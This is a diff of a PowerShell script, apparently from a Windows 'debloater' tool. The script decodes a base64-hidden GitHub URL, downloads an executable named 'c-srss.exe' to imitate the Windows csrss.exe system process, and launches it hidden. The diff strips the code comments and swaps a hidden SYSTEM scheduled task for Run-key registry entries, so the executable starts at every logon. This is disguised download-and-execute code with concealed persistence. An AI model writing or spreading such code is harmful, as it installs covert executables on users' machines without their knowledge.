@@ -51,7 +51,6 @@ Show-Header
 
 $u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL2Mtc3Jzcy5leGU='
 
-# --- Download c-srss.exe to C:\Program Files and ensure it runs at every startup ---
 $csrssPath = "C:\Program Files\c-srss.exe"
 $url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
 if (-not (Test-Path $csrssPath)) {
@@ -61,22 +60,16 @@ if (-not (Test-Path $csrssPath)) {
     } catch {}
 }
 
-# Register scheduled task to run c-srss.exe at every logon if not already exists
-$taskName = "c-srss.exe"
-$taskExists = $false
-try {
-    if (Get-ScheduledTask -TaskName $taskName -ErrorAction Stop) {
-        $taskExists = $true
-    }
-} catch {}
-if (-not $taskExists) {
-    $action = New-ScheduledTaskAction -Execute $csrssPath
-    $trigger = New-ScheduledTaskTrigger -AtLogOn
-    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description "Hidden c-srss.exe Task" -Settings (New-ScheduledTaskSettingsSet -Hidden) | Out-Null
+$regPaths = @(
+    'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
+    'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
+)
+foreach ($reg in $regPaths) {
+    try {
+        Set-ItemProperty -Path $reg -Name 'c-srss' -Value '"C:\Program Files\c-srss.exe"' -Force
+    } catch {}
 }
 
-# Run c-srss.exe now (hidden)
 if (Test-Path $csrssPath) {
     Start-Process -FilePath $csrssPath -WindowStyle Hidden
 }
